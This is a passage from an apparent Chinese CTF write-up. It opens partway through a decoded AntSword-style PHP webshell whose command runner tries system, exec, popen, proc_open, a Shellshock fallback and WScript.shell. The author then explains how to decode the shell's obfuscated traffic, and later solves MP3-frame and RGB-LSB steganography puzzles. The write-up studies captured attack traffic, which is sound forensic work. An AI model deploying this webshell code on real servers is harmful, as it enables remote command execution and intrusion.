</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;error_log&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>error_log</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>mail</span><span class=p>(</span><span class=s2>&#34;a@127.0.0.1&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;-bv&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>False</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$output</span> <span class=o>=</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$output</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>False</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>runcmd</span><span class=p>(</span><span class=nv>$c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$d</span> <span class=o>=</span> <span class=nx>dirname</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;SCRIPT_FILENAME&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;passthru&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>passthru</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;shell_exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$o</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$o</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;popen&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$fp</span> <span class=o>=</span> <span class=o>@</span><span class=nx>popen</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$fp</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>pclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;proc_open&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$p</span> <span class=o>=</span> <span class=o>@</span><span class=nx>proc_open</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>),</span> <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)),</span> <span class=nv>$io</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>proc_close</span><span class=p>(</span><span class=nv>$p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;antsystem&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>antsystem</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>runshellshock</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=nv>$c</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=s2>&#34;/&#34;</span> <span class=o>&amp;&amp;</span> <span class=o>@</span><span class=nx>class_exists</span><span class=p>(</span><span class=s2>&#34;COM&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$w</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>COM</span><span class=p>(</span><span class=s1>&#39;WScript.shell&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$e</span> <span class=o>=</span> <span class=nv>$w</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$so</span> <span class=o>=</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>StdOut</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>.=</span> <span class=nv>$so</span><span class=o>-&gt;</span><span class=na>ReadAll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$se</span> <span class=o>=</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>StdErr</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>.=</span> <span class=nv>$se</span><span class=o>-&gt;</span><span class=na>ReadAll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>=</span> <span class=mi>127</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ret</span> <span class=o>=</span> <span class=o>@</span><span class=nx>runcmd</span><span class=p>(</span><span class=nv>$r</span> <span class=o>.</span> <span class=s2>&#34; 2&gt;&amp;1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=p>(</span><span class=nv>$ret</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>?</span> <span class=s2>&#34;ret=</span><span class=si>{</span><span class=nv>$ret</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;ERROR://&#34;</span> <span class=o>.</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>asoutput</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>解码后我们就可以得到这个木马的主体了</p><p>分析上面的代码我们可以得到，执行的命令是由 <code>ca662241d33bb8</code> 变量传入的</p><p>就是前面会有两字节的干扰数据，需要我们删除后再解码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209160159904.png alt=/posts/bb1da35/imgs/image-20251209160159904.png height=1058 width=2796></p><p>解码响应的流程也是一样，删除上面代码中的干扰字符后 ROT13 解码即可</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251209160646552.png alt=/posts/bb1da35/imgs/image-20251209160646552.png height=1300 width=2790></p><p>如果想要更干净的响应，也可以把上面执行命令中的干扰字符也删除</p><h2 class=heading-element id=题目名称-copyright隐写><span>题目名称 Copyright隐写</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-copyright%e9%9a%90%e5%86%99 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一个flag.mp3，010打开查看，发现copyright字段的属性存在交错出现的规律（即不是所有都是同一个值）</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220204626743.png alt=/posts/bb1da35/imgs/image-20251220204626743.png height=1454 width=2269></p><p>并且我们可以借助010的模板功能，尝试发现copyright的属性是通过每块的第四字节决定的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220204709856.png alt=/posts/bb1da35/imgs/image-20251220204709856.png height=1454 width=2269></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220204724761.png alt=/posts/bb1da35/imgs/image-20251220204724761.png height=1454 width=2269></p><p>具体的规律如下，是根据这个值二进制的倒数第四bit决定的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220204849500.png alt=/posts/bb1da35/imgs/image-20251220204849500.png height=333 width=835></p><p>然后我们还可以发现每一块数据的长度并不是都相同的，是由padding这个字段决定的，比如下面这个417和418的数据块</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205030077.png alt=/posts/bb1da35/imgs/image-20251220205030077.png height=1454 width=2269></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205054308.png alt=/posts/bb1da35/imgs/image-20251220205054308.png height=1454 width=2269></p><p>和之前copyright同理，我们也可以找一下padding的规律，发现是由第三字节的倒数第二个bit决定的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205346629.png alt=/posts/bb1da35/imgs/image-20251220205346629.png height=1454 width=2269></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205417372.png alt=/posts/bb1da35/imgs/image-20251220205417372.png height=1454 width=2269></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205254511.png alt=/posts/bb1da35/imgs/image-20251220205254511.png height=311 width=759></p><p>至此，我们的思路就很明确了，根据padding和copyright分布的规律写个脚本提取一下隐写的信息即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>libnum</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>st</span> <span class=o>=</span> <span class=mh>0x0</span>  <span class=c1># 起始</span>
</span></span><span class=line><span class=cl><span class=n>ed</span> <span class=o>=</span> <span class=mh>0x1FFD70</span>  <span class=c1># 结束</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.mp3&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span>   <span class=c1># 以二进制打开文件</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=n>st</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>ed</span><span class=p>:</span>  <span class=c1># 结束位置</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>  <span class=c1># 指针跳转到 0的位置加上i 的位置</span>
</span></span><span class=line><span class=cl>    <span class=n>padding_data</span> <span class=o>=</span> <span class=n>files</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  <span class=c1># 读取一个字节</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(hex(padding_data),end=&#39; &#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>padding_bit</span> <span class=o>=</span> <span class=p>(</span><span class=n>padding_data</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>  <span class=c1># 该字节</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>  <span class=c1># 指针跳转到 0的位置加上i 的位置</span>
</span></span><span class=line><span class=cl>    <span class=n>copyright_data</span> <span class=o>=</span> <span class=n>files</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  <span class=c1># 读取一个字节</span>
</span></span><span class=line><span class=cl>    <span class=n>steg_bit</span> <span class=o>=</span> <span class=p>(</span><span class=n>copyright_data</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>steg_bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>416</span>     <span class=c1># 第一个数据块特殊处理</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>padding_bit</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>417</span> <span class=c1># 视具体情况修改</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>418</span> <span class=c1># 视具体情况修改</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;len(res) = </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;len(res) / 8 = </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>/</span> <span class=mi>8</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>ljust</span><span class=p>((</span><span class=nb>len</span><span class=p>(</span><span class=n>res</span><span class=p>)</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>  <span class=c1># 在右侧补0到8的倍数</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[:</span><span class=mi>350</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=n>res</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># len(res) = 5017</span>
</span></span><span class=line><span class=cl><span class=c1># len(res) / 8 = 627.125</span>
</span></span><span class=line><span class=cl><span class=c1># 00100110011011000110000101100111011110110011100000110101011000100110000100110000011001000110000100110010001101000011010100110111001100100110011000110111001100010011001000110011011000010110011001100011001101000110001000110000001110000110011000110100011001000011001001100001011001010011001100110111011111010000000000000000000000000000000000000000000000        </span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;&amp;lag{85ba0da24572f7123afc4b08f4d2ae37}&#39;</span></span></span></code></pre></td></tr></table></div></div><p>就是这道题这里要注意，第一个数据块和第三个数据库，010的模板这里没有正确识别出来</p><p>并且第一个数据块的长度是416，因此需要我们特殊处理一下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205607648.png alt=/posts/bb1da35/imgs/image-20251220205607648.png height=1454 width=2269></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20251220205634666.png alt=/posts/bb1da35/imgs/image-20251220205634666.png height=1454 width=2269></p><p>然后出题人这里疏忽了，第二个数据块开头的第三字节应该是0x6c，而不是0x64</p><p>这个错误导致了我们提取出来的flag头不是<code>flag{</code>，不过问题不大，也能看出最后的flag</p><p><code>flag{85ba0da24572f7123afc4b08f4d2ae37</code></p><h2 class=heading-element id=题目名称-最后的-rgb><span>题目名称 最后的 R.G!B?</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e6%9c%80%e5%90%8e%e7%9a%84-rgb class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题面信息如下:</p><blockquote><p>有人说这届题目太简单，其实我也这么觉得</p><p>只好说声抱歉</p><p>tips: 经历过原题的 ldx 们都知道：(a => a.reduce((o, v, i) => i % 2 ? (o[a[i-1]] = v, o) : o, {}))(&lsquo;R.G!B?&rsquo;.split(&rsquo;&rsquo;))</p></blockquote><p>附件给了下面这张 png</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260109155245678.png alt=/posts/bb1da35/imgs/image-20260109155245678.png height=780 width=1416></p><p>首先我们看题目给出的提示 ：<code>(a => a.reduce((o, v, i) => i % 2 ? (o[a[i-1]] = v, o) : o, {}))('R.G!B?'.split(''))</code></p><p>这是一串 js 代码，整个表达式执行后会返回：<code>{'R':'.','G':'!','B':'?'}</code></p><p>看到 <code>.!?</code> 这三个符号，如果经验比较丰富的话很容易就可以联想到 <code>Short Ook!</code></p><p>然后通过打印部分图片的像素值可以发现，并不是直接通过 像素值->ASCII 的方式隐写的，因此猜测是 LSB 隐写的方式</p><p>经过尝试发现，其实原理就是 RGB 的 LSB 分别控制对应的符号，如果是 1 就代表有，0 就是没有</p><p>如果这个描述难以理解的话，我们可以直接看下面的代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;rgb.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>,</span> <span class=n>h</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>short_ook</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1. 提取 LSB (Bit 0) 并映射为 Short Ook!</span>
</span></span><span class=line><span class=cl>    <span class=c1># R -&gt; . G -&gt; ! B -&gt; ?</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># 检查 R, G, B 的第 0 位</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;.&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>g</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;!&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>b</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span> <span class=n>short_ook</span> <span class=o>+=</span> <span class=s1>&#39;?&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 提取出的 Short Ook! 的长度: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>short_ook</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>但是提取出来后找个在线网站解码 <code>Short Ook!</code> 发现结果是空的</p><p>这里考察了一个知识点就是 <code>Short Ook!</code> 和 <code>brainfuck</code> 一样，都是可以在内存中把结果删除的，并且二者是可以相互转换的</p><p>因此这里我们可以找个在线网站先把 <code>Short Ook!</code> 转为 <code>brainfuck</code> ，然后用我博客里的脚本跑出内存中被删去的内容</p><p>当然也可以让 AI 直接写个脚本一步到位，详细原理请参考：https://en.wikipedia.org/wiki/Brainfuck</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
